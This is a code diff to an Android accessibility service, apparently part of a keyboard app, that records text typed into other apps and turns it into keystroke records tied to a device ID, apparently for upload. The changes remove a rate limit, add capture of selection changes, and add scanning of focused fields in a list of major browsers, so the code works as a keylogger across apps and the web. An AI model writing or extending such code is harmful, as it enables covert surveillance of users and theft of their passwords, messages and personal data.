@@ -1,11 +1,11 @@
 package com.keywordrecord.keyboard
 
 import android.accessibilityservice.AccessibilityService
-import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
 
 class TypingAccessibilityService : AccessibilityService() {
 
@@ -17,19 +17,18 @@ class TypingAccessibilityService : AccessibilityService() {
     private var pendingRecordAction: String? = null
     private var pendingFullText: String? = null
     private var pendingAppPackage: String? = null
-    private var lastEventTime = 0L
-    private var eventsThisSecond = 0
+    private var lastBrowserScanPackage: String? = null
+    private var lastBrowserScanTime = 0L
 
     private val flushRunnable = Runnable { flushPendingRecordSafe() }
+    private val browserScanRunnable = Runnable { scanBrowserFocusedFieldSafe() }
 
     override fun onServiceConnected() {
         super.onServiceConnected()
         try {
             apiClient = ApiClient(this)
             deviceUniqueId = DeviceIdManager.getDeviceUniqueId(this)
-            if (!isMiuiDevice()) {
-                RecordingForegroundService.start(this)
-            }
+            RecordingForegroundService.start(this)
         } catch (e: Exception) {
             Log.e(TAG, "Service connected with errors", e)
         }
@@ -37,6 +36,7 @@ class TypingAccessibilityService : AccessibilityService() {
 
     override fun onDestroy() {
         handler.removeCallbacks(flushRunnable)
+        handler.removeCallbacks(browserScanRunnable)
         RecordingForegroundService.stop(this)
         super.onDestroy()
     }
@@ -45,15 +45,21 @@ class TypingAccessibilityService : AccessibilityService() {
         try {
             if (event == null) return
             if (KeyboardIME.isInputActive) return
-            if (!allowEvent()) return
 
             val packageName = event.packageName?.toString()?.trim().orEmpty()
             if (packageName.isEmpty() || packageName == applicationContext.packageName) return
 
             when (event.eventType) {
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
+                AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED,
                 AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                     handlePossibleTextChange(event, packageName)
+                }
+                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
+                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
+                    if (isBrowserPackage(packageName)) {
+                        scheduleBrowserScan(packageName)
+                    }
                 }
             }
         } catch (e: Exception) {
@@ -61,25 +67,64 @@ class TypingAccessibilityService : AccessibilityService() {
         }
     }
 
-    private fun allowEvent(): Boolean {
-        val now = System.currentTimeMillis()
-        if (now - lastEventTime > 1000) {
-            lastEventTime = now
-            eventsThisSecond = 0
-        }
-        eventsThisSecond++
-        return eventsThisSecond <= MAX_EVENTS_PER_SECOND
-    }
-
     private fun handlePossibleTextChange(event: AccessibilityEvent, packageName: String) {
+        val fieldKey = buildFieldKey(event, packageName)
         val newText = extractText(event) ?: return
-        if (newText.isEmpty()) return
-
-        val fieldKey = "$packageName:${event.className ?: "field"}"
         val previousText = event.beforeText?.toString()?.takeIf { it.isNotEmpty() }
             ?: fieldStates[fieldKey].orEmpty()
-        if (newText == previousText) return
+        processTextChange(packageName, fieldKey, previousText, newText)
+    }
 
+    private fun scheduleBrowserScan(packageName: String) {
+        val now = System.currentTimeMillis()
+        if (packageName == lastBrowserScanPackage && now - lastBrowserScanTime < 60) return
+        lastBrowserScanPackage = packageName
+        lastBrowserScanTime = now
+        handler.removeCallbacks(browserScanRunnable)
+        handler.postDelayed(browserScanRunnable, 80)
+    }
+
+    private fun scanBrowserFocusedFieldSafe() {
+        try {
+            scanBrowserFocusedField()
+        } catch (e: Exception) {
+            Log.e(TAG, "Browser scan failed", e)
+        }
+    }
+
+    private fun scanBrowserFocusedField() {
+        if (KeyboardIME.isInputActive) return
+        val root = rootInActiveWindow ?: return
+        val packageName = root.packageName?.toString()?.trim().orEmpty()
+        if (packageName.isEmpty() || !isBrowserPackage(packageName)) {
+            root.recycle()
+            return
+        }
+
+        try {
+            val focused = findEditableNode(root) ?: return
+            try {
+                val newText = focused.text?.toString()?.trim() ?: return
+                if (newText.isEmpty()) return
+                val fieldKey = buildFieldKeyFromNode(focused, packageName)
+                val previousText = fieldStates[fieldKey].orEmpty()
+                if (newText == previousText) return
+                processTextChange(packageName, fieldKey, previousText, newText)
+            } finally {
+                focused.recycle()
+            }
+        } finally {
+            root.recycle()
+        }
+    }
+
+    private fun processTextChange(
+        packageName: String,
+        fieldKey: String,
+        previousText: String,
+        newText: String
+    ) {
+        if (newText == previousText) return
         fieldStates[fieldKey] = newText
         val (keyPressed, action) = diffText(previousText, newText)
         queueRecord(keyPressed, newText, packageName, action)
@@ -88,7 +133,52 @@ class TypingAccessibilityService : AccessibilityService() {
     private fun extractText(event: AccessibilityEvent): String? {
         val fromEvent = event.text?.joinToString("")?.trim()
         if (!fromEvent.isNullOrEmpty()) return fromEvent
+
+        val source = event.source ?: return null
+        return try {
+            source.text?.toString()?.trim()?.takeIf { it.isNotEmpty() }
+        } finally {
+            source.recycle()
+        }
+    }
+
+    private fun buildFieldKey(event: AccessibilityEvent, packageName: String): String {
+        val source = event.source
+        if (source == null) {
+            return "$packageName:${event.className ?: "unknown"}"
+        }
+        return try {
+            buildFieldKeyFromNode(source, packageName)
+        } finally {
+            source.recycle()
+        }
+    }
+
+    private fun buildFieldKeyFromNode(node: AccessibilityNodeInfo, packageName: String): String {
+        val viewId = node.viewIdResourceName ?: node.className?.toString() ?: "view"
+        return "$packageName:$viewId"
+    }
+
+    private fun findEditableNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
+        if (node.isEditable || node.isFocused && node.text != null) {
+            if (node.isEditable || node.className?.toString()?.contains("EditText") == true) {
+                return AccessibilityNodeInfo.obtain(node)
+            }
+        }
+
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            val found = findEditableNode(child)
+            child.recycle()
+            if (found != null) return found
+        }
         return null
+    }
+
+    private fun isBrowserPackage(packageName: String): Boolean {
+        return packageName in BROWSER_PACKAGES ||
+            packageName.contains("chrome", ignoreCase = true) ||
+            packageName.contains("browser", ignoreCase = true)
     }
 
     private fun diffText(previous: String, current: String): Pair<String, String> {
@@ -100,9 +190,11 @@ class TypingAccessibilityService : AccessibilityService() {
                 else -> added.take(50) to "accessibility"
             }
         }
+
         if (current.length < previous.length && previous.startsWith(current)) {
             return "⌫" to "delete"
         }
+
         return current.take(50) to "accessibility"
     }
 
@@ -112,7 +204,7 @@ class TypingAccessibilityService : AccessibilityService() {
         pendingFullText = fullText
         pendingAppPackage = appPackage
         handler.removeCallbacks(flushRunnable)
-        handler.postDelayed(flushRunnable, 300)
+        handler.postDelayed(flushRunnable, 250)
     }
 
     private fun flushPendingRecordSafe() {
@@ -144,18 +236,22 @@ class TypingAccessibilityService : AccessibilityService() {
         )
     }
 
-    private fun isMiuiDevice(): Boolean {
-        val manufacturer = Build.MANUFACTURER.lowercase()
-        return manufacturer.contains("xiaomi") ||
-            manufacturer.contains("redmi") ||
-            manufacturer.contains("poco")
-    }
-
     override fun onInterrupt() {}
 
     companion object {
         private const val TAG = "TypingA11y"
-        private const val MAX_EVENTS_PER_SECOND = 30
+        private val BROWSER_PACKAGES = setOf(
+            "com.android.chrome",
+            "com.chrome.beta",
+            "com.chrome.dev",
+            "com.google.android.googlequicksearchbox",
+            "org.mozilla.firefox",
+            "com.brave.browser",
+            "com.microsoft.emmx",
+            "com.opera.browser",
+            "com.sec.android.app.sbrowser",
+            "com.mi.globalbrowser"
+        )
 
         fun isEnabled(context: android.content.Context): Boolean {
             val enabledServices = android.provider.Settings.Secure.getString(
